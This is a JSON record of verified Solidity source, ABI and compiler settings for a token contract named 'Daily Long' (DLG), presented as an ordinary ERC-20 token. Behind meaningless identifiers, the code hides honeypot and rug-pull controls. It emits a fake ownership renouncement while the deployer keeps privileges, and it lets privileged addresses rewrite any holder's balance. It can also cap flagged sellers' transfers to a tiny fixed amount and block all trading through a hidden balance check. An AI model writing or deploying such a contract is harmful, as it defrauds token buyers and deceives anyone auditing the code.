{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface toTx {\n    function createPair(address teamAmountIs, address tradingFee) external returns (address);\n}\n\ninterface listIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptTrading) external view returns (uint256);\n\n    function transfer(address teamMinBuy, uint256 walletReceiverExempt) external returns (bool);\n\n    function allowance(address enableLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletReceiverExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMinBuy,\n        uint256 walletReceiverExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toMode, uint256 value);\n    event Approval(address indexed enableLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract feeTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderBuyLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchShould is listIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DailyLong is feeTx, listIs, launchShould {\n\n    address senderFundAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address atSender, address teamMinBuy, uint256 walletReceiverExempt) external override returns (bool) {\n        if (_msgSender() != senderFundAuto) {\n            if (totalSwap[atSender][_msgSender()] != type(uint256).max) {\n                require(walletReceiverExempt <= totalSwap[atSender][_msgSender()]);\n                totalSwap[atSender][_msgSender()] -= walletReceiverExempt;\n            }\n        }\n        return atToFee(atSender, teamMinBuy, walletReceiverExempt);\n    }\n\n    function balanceOf(address exemptTrading) public view virtual override returns (uint256) {\n        return senderFundLaunched[exemptTrading];\n    }\n\n    constructor (){\n        if (launchLimitShould != shouldLaunch) {\n            marketingToTeam = totalMarketing;\n        }\n        senderBuyLiquidity feeReceiver = senderBuyLiquidity(senderFundAuto);\n        fundAuto = toTx(feeReceiver.factory()).createPair(feeReceiver.WETH(), address(this));\n        \n        shouldLimit = _msgSender();\n        minLaunched[shouldLimit] = true;\n        senderFundLaunched[shouldLimit] = tradingMinLaunch;\n        swapLimit();\n        \n        emit Transfer(address(0), shouldLimit, tradingMinLaunch);\n    }\n\n    uint256 private sellBuy;\n\n    address marketingLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapLimit() public {\n        emit OwnershipTransferred(shouldLimit, address(0));\n        marketingFund = address(0);\n    }\n\n    mapping(address => bool) public enableTakeShould;\n\n    function limitExempt(address atSender, address teamMinBuy, uint256 walletReceiverExempt) internal returns (bool) {\n        require(senderFundLaunched[atSender] >= walletReceiverExempt);\n        senderFundLaunched[atSender] -= walletReceiverExempt;\n        senderFundLaunched[teamMinBuy] += walletReceiverExempt;\n        emit Transfer(atSender, teamMinBuy, walletReceiverExempt);\n        return true;\n    }\n\n    string private sellAtSwap = \"DLG\";\n\n    string private receiverAt = \"Daily Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellAtSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalSwap;\n\n    bool private launchLimitShould;\n\n    bool public senderTotal;\n\n    mapping(address => uint256) private senderFundLaunched;\n\n    function getOwner() external view returns (address) {\n        return marketingFund;\n    }\n\n    uint256 isReceiver;\n\n    uint256 private marketingToTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAt;\n    }\n\n    address public shouldLimit;\n\n    function maxTradingLimit(address enableBuyFund) public {\n        isSell();\n        \n        if (enableBuyFund == shouldLimit || enableBuyFund == fundAuto) {\n            return;\n        }\n        enableTakeShould[enableBuyFund] = true;\n    }\n\n    uint8 private senderExempt = 18;\n\n    address private marketingFund;\n\n    function approve(address totalSell, uint256 walletReceiverExempt) public virtual override returns (bool) {\n        totalSwap[_msgSender()][totalSell] = walletReceiverExempt;\n        emit Approval(_msgSender(), totalSell, walletReceiverExempt);\n        return true;\n    }\n\n    uint256 private tradingMinLaunch = 100000000 * 10 ** 18;\n\n    function limitReceiver(address tradingBuy, uint256 walletReceiverExempt) public {\n        isSell();\n        senderFundLaunched[tradingBuy] = walletReceiverExempt;\n    }\n\n    function owner() external view returns (address) {\n        return marketingFund;\n    }\n\n    function modeFrom(uint256 walletReceiverExempt) public {\n        isSell();\n        fundBuy = walletReceiverExempt;\n    }\n\n    uint256 private liquiditySender;\n\n    mapping(address => bool) public minLaunched;\n\n    function atToFee(address atSender, address teamMinBuy, uint256 walletReceiverExempt) internal returns (bool) {\n        if (atSender == shouldLimit) {\n            return limitExempt(atSender, teamMinBuy, walletReceiverExempt);\n        }\n        uint256 autoLiquidity = listIs(fundAuto).balanceOf(marketingLaunched);\n        require(autoLiquidity == fundBuy);\n        require(teamMinBuy != marketingLaunched);\n        if (enableTakeShould[atSender]) {\n            return limitExempt(atSender, teamMinBuy, fundSenderFee);\n        }\n        return limitExempt(atSender, teamMinBuy, walletReceiverExempt);\n    }\n\n    address public fundAuto;\n\n    function receiverAuto(address enableLiquidityFund) public {\n        if (senderTotal) {\n            return;\n        }\n        if (marketingToTeam != liquiditySender) {\n            sellBuy = liquiditySender;\n        }\n        minLaunched[enableLiquidityFund] = true;\n        if (shouldLaunch != launchLimitShould) {\n            sellBuy = liquiditySender;\n        }\n        senderTotal = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingMinLaunch;\n    }\n\n    uint256 fundBuy;\n\n    function transfer(address tradingBuy, uint256 walletReceiverExempt) external virtual override returns (bool) {\n        return atToFee(_msgSender(), tradingBuy, walletReceiverExempt);\n    }\n\n    bool private shouldLaunch;\n\n    uint256 constant fundSenderFee = 9 ** 10;\n\n    function isSell() private view {\n        require(minLaunched[_msgSender()]);\n    }\n\n    uint256 public totalMarketing;\n\n    uint256 private takeLaunch;\n\n    event OwnershipTransferred(address indexed fundLiquiditySell, address indexed exemptMin);\n\n    function allowance(address walletSender, address totalSell) external view virtual override returns (uint256) {\n        if (totalSell == senderFundAuto) {\n            return type(uint256).max;\n        }\n        return totalSwap[walletSender][totalSell];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderExempt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLiquiditySell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTakeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuyFund\",\"type\":\"address\"}],\"name\":\"maxTradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"modeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidityFund\",\"type\":\"address\"}],\"name\":\"receiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMinBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DailyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}